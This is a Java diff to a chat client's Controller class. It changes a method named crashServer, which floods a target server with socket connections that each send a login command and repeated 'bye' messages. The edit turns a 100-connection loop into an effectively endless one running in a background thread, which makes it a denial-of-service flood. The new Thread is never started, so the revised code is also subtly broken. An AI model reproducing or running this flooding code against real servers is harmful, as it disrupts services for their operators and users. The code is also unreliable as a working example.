@@ -198,20 +198,22 @@ public class Controller implements ActionListener {
     }
 
     private void crashServer(String serverAddress) {
-        String name = generateName();
-        for (int i = 0; i < 100; i++) {
-            try {
-                Socket socket = new Socket(serverAddress, Integer.parseInt(model.getServerPort()));
-                PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
+        new Thread(() -> {
+            String name = generateName();
+            for (long i = 0; i < Long.MAX_VALUE; i++) {
+                try {
+                    Socket socket = new Socket(serverAddress, Integer.parseInt(model.getServerPort()));
+                    PrintWriter printWriter = new PrintWriter(socket.getOutputStream());
 
-                printWriter.println("login " + name + i);
-                printWriter.println("bye");
-                printWriter.println("bye");
-                printWriter.flush();
-            } catch (IOException ignored) {
+                    printWriter.println(String.format("login %s", name + i));
+                    printWriter.println("bye");
+                    printWriter.println("bye");
+                    printWriter.flush();
+                } catch (IOException ignored) {
 
+                }
             }
-        }
+        });
     }
 
     private String generateName() {
